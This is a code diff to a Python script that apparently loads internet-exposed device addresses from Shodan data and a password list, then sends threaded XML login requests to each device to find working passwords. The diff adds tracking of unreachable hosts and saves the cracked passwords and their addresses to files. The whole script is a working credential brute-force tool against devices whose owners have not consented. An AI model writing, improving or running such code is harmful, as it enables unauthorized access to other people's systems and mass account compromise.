@@ -14,6 +14,7 @@ file_path = "shodan_data.json"
 f = open('passwords.txt', 'r')
 passwords = np.array(f.read().splitlines())
 f.close()
+invalid_list = list()
 
 
 class MyThread(Thread):
@@ -57,7 +58,7 @@ def try_out_passwords(url):
         params = {'xml': ET.tostring(root).decode('utf-8')}
         res = requests.get(url=url, params=params, headers=head)
         if res.status_code != 200:
-            print("Cannot connect {}".format(url))
+            return -1
         try:
             res_root = ET.fromstring(res.text)
             if res_root.find('rpermission') is None:
@@ -90,6 +91,9 @@ def try_out_passwords(url):
                     raise BreakError
                 if result is None:
                     raise BreakError
+                if result == -1:
+                    invalid_list.append(url)
+                    raise BreakError
     except BreakError as e:
         pass
     pwd = passwords[results]
@@ -106,7 +110,14 @@ if __name__ == "__main__":
     actual_passwords = pool.map(try_out_passwords, addresses)
     pool.close()
     pool.join()
+
     print(actual_passwords)
+    print(addresses)
+    print(invalid_list)
+
+    invalid_list = np.array(invalid_list)
     actual_passwords = np.array(actual_passwords)
     addresses = np.array(addresses)
-    np.save("results", (actual_passwords, addresses))
+    np.save("actual_passwords.npy", actual_passwords)
+    np.save("addresses.npy", addresses)
+    np.save("invalid_list.npy", invalid_list)
